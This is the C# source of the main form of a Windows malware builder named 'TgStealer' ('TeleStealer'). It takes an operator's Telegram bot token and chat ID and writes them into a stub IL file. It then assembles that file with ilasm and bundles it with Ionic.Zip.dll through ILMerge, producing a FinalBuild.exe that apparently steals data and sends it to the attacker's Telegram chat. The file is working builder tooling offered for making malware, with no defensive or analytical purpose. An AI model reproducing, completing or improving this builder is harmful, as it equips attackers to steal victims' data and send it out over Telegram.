using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;


namespace TgStealer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void closedLabel_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void label4_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            this.Capture = false;
            var msg = Message.Create(this.Handle, 0xa1, new IntPtr(2), IntPtr.Zero);
            this.WndProc(ref msg);
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            string token = tokenBox.Text;
            string chatid = chatidBox.Text;

            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatid))
            {
                MessageBox.Show("Please enter token and chatid!");
            }
            else
            {
                string folderPath = "stub";
                string buildPath = "build";
                string stubFileName = "stub.il";
                string ildasmPath = "compilator\\ildasm.exe";
                string ilasmPath = "compilator\\ilasm.exe";
                string ilmergePath = "compilator\\ILMerge.exe";

                // Полный путь к файлу stub.il
                string stubFilePath = Path.Combine(folderPath, stubFileName);

                if (Directory.Exists(folderPath) && Directory.Exists(buildPath) && File.Exists(stubFilePath))
                {
                    cmdPanelBox.Text += $"\nFolder: {folderPath} found!";
                    cmdPanelBox.Text += $"\nFolder: {buildPath} found!";

                    // Прочитать содержимое файла stub.il
                    string ilCode = File.ReadAllText(stubFilePath);

                    // Заменить значения KINGTOKEN и KINGCHATID
                    ilCode = ilCode.Replace("KINGTOKENBOT", token);
                    ilCode = ilCode.Replace("KINGCHATID", chatid);

                    // Создать временный файл с измененным содержимым
                    string tempFilePath = Path.Combine(folderPath, "stubtemp.il");
                    File.WriteAllText(tempFilePath, ilCode, Encoding.UTF8);

                    // Компилировать временный файл в исполняемый
                    string exeOutputPath = Path.Combine(buildPath, "BUILD.exe");
                    string ilasmArguments = $"/output={exeOutputPath} {tempFilePath}";

                    var processInfo = new System.Diagnostics.ProcessStartInfo(ilasmPath, ilasmArguments)
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    };

                    using (var process = System.Diagnostics.Process.Start(processInfo))
                    {
                        string output = await process.StandardOutput.ReadToEndAsync();
                        cmdPanelBox.Text += $"\nILASM Output: {output}";

                        process.WaitForExit();
                        if (process.ExitCode == 0)
                        {
                            cmdPanelBox.Text += $"\nBUILD.exe created successfully: {exeOutputPath}";

                            // Используем ILMerge для объединения BUILD.exe и Ionic.Zip.dll
                            string finalBuildPath = Path.Combine(buildPath, "FinalBuild.exe");
                            string ilmergeArguments = $"/out:{finalBuildPath} {exeOutputPath} {folderPath}\\Ionic.Zip.dll";

                            processInfo = new System.Diagnostics.ProcessStartInfo(ilmergePath, ilmergeArguments)
                            {
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                CreateNoWindow = true
                            };

                            using (var mergeProcess = System.Diagnostics.Process.Start(processInfo))
                            {
                                string mergeOutput = await mergeProcess.StandardOutput.ReadToEndAsync();
                                cmdPanelBox.Text += $"\nILMerge Output: {mergeOutput}";

                                mergeProcess.WaitForExit();
                                if (mergeProcess.ExitCode == 0)
                                {
                                    cmdPanelBox.Text += $"\nFinalBuild.exe created successfully: {finalBuildPath}";
                                    Process.Start("explorer.exe", $"/select,\"{finalBuildPath}\"");

                                }
                                else
                                {
                                    cmdPanelBox.ForeColor = Color.Red;
                                    cmdPanelBox.Text += $"\nError during ILMerge.";
                                }
                            }

                            // Удаление временных файлов
                            File.Delete(tempFilePath);
                            File.Delete(exeOutputPath);
                        }
                        else
                        {
                            cmdPanelBox.ForeColor = Color.Red;
                            cmdPanelBox.Text += $"\nError during compilation.";
                        }
                    }
                }
                else
                {
                    cmdPanelBox.ForeColor = Color.Red;
                    cmdPanelBox.Text = $"\nDirectory: {folderPath} or {buildPath} not found, or {stubFileName} not found!";
                }
            }
        }

        private void clearBtn_Click(object sender, EventArgs e)
        {
            tokenBox.Text = "";
            chatidBox.Text = "";
            cmdPanelBox.ForeColor = Color.LightGreen;
            cmdPanelBox.Text = "TeleStealer: Ready";
        }

        private void aboutBtn_Click(object sender, EventArgs e)
        {
            about FormAbout = new about();
            FormAbout.Show();

        }
    }
}
